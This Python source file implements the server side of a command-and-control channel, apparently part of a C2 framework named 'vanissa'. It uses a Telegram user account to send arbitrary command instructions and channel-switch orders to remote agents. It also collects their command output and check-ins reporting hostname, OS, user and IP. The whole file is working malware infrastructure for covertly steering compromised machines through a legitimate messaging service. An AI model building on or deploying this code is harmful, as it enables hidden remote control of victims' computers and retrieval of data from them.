"""
Telegram C2 Channel — server-side Telethon user client.
Sends INSTRUCTION/SWITCH messages and polls for RESULT/CHECKIN/SWITCHACK.
"""

import asyncio
import threading
import time
import logging

from telethon import TelegramClient
from core.channel import C2Channel
from core.agent import AgentRegistry

log = logging.getLogger("vanissa.telegram")


class TelegramChannel(C2Channel):
    """
    Telegram channel using a Telethon **user client** (not bot).
    Runs its own asyncio event loop in a dedicated daemon thread.
    """

    def __init__(self, api_id: int, api_hash: str, phone: str,
                 chat_id: int, registry: AgentRegistry):
        self._api_id   = api_id
        self._api_hash = api_hash
        self._phone    = phone
        self._chat_id  = chat_id
        self._registry = registry

        self._loop: asyncio.AbstractEventLoop = None
        self._client: TelegramClient = None
        self._thread: threading.Thread = None
        self._connected = False

    # ─── C2Channel interface ───────────────────────────

    @property
    def name(self) -> str:
        return "telegram"

    def connect(self):
        self._loop = asyncio.new_event_loop()
        self._client = TelegramClient(
            "server_session", self._api_id, self._api_hash,
            loop=self._loop
        )

        self._thread = threading.Thread(
            target=self._run_loop, daemon=True, name="telethon-loop"
        )
        self._thread.start()

        deadline = time.time() + 60
        while not self._connected and time.time() < deadline:
            time.sleep(0.3)

        if not self._connected:
            raise ConnectionError("Telegram client failed to connect within 60s (Did you enter the login code?)")

        asyncio.run_coroutine_threadsafe(self._poll_messages(), self._loop)
        log.info("[telegram] Connected and polling")

    def send_instruction(self, agent_id: str, instruction_id: str, command: str):
        """Send INSTRUCTION|agent_id|instr_id|command."""
        msg = f"INSTRUCTION|{agent_id}|{instruction_id}|{command}"
        self._send(msg)

    def send_switch(self, agent_id: str, target_channel: str):
        """Send SWITCH|agent_id|channel_name."""
        msg = f"SWITCH|{agent_id}|{target_channel}"
        self._send(msg)

    def disconnect(self):
        if self._client and self._connected:
            asyncio.run_coroutine_threadsafe(
                self._client.disconnect(), self._loop
            )
            self._connected = False
            log.info("[telegram] Disconnected")

    # ─── Internal ──────────────────────────────────────

    def _send(self, text: str):
        future = asyncio.run_coroutine_threadsafe(
            self._client.send_message(self._chat_id, text),
            self._loop
        )
        future.result(timeout=10)

    def _run_loop(self):
        asyncio.set_event_loop(self._loop)
        self._loop.run_until_complete(self._start_client())
        self._loop.run_forever()

    async def _start_client(self):
        await self._client.start(phone=self._phone)
        self._connected = True
        log.info("[telegram] User client authenticated")

    async def _poll_messages(self):
        log.info("[telegram] Polling loop started")
        last_seen_id = None

        while True:
            try:
                messages = await self._client.get_messages(
                    self._chat_id, limit=10
                )

                for msg in reversed(messages):
                    if last_seen_id is not None and msg.id <= last_seen_id:
                        continue

                    last_seen_id = msg.id
                    text = msg.text or ""
                    if not text:
                        continue

                    # ── RESULT|<agent_id>|<instr_id>|<output> ──
                    if text.startswith("RESULT|"):
                        parts = text.split("|", 3)
                        if len(parts) == 4:
                            _, agent_id, instr_id, output = parts
                            self._registry.update_last_seen(agent_id, self.name)
                            self._on_result(agent_id, instr_id, output)

                    # ── CHECKIN|<agent_id>|<hostname>|<os>|<user>|<ip> ──
                    elif text.startswith("CHECKIN|"):
                        parts = text.split("|", 5)
                        if len(parts) == 6:
                            _, aid, hostname, os_name, user, ip = parts
                            self._registry.register(
                                aid, hostname, os_name, user, ip, self.name
                            )
                            self._on_checkin(aid, hostname, os_name, user, ip)
                            log.info(f"[telegram] Agent checked in: {aid} ({hostname} / {ip})")

                    # ── SWITCHACK|<agent_id>|<channel_name> ──
                    elif text.startswith("SWITCHACK|"):
                        parts = text.split("|", 2)
                        if len(parts) == 3:
                            _, aid, ch_name = parts
                            self._registry.update_channel(aid, ch_name)
                            self._on_switchack(aid, ch_name)
                            log.info(f"[telegram] Agent {aid} switched to {ch_name}")

            except Exception as e:
                log.error(f"[telegram] Polling error: {e}")

            await asyncio.sleep(1)
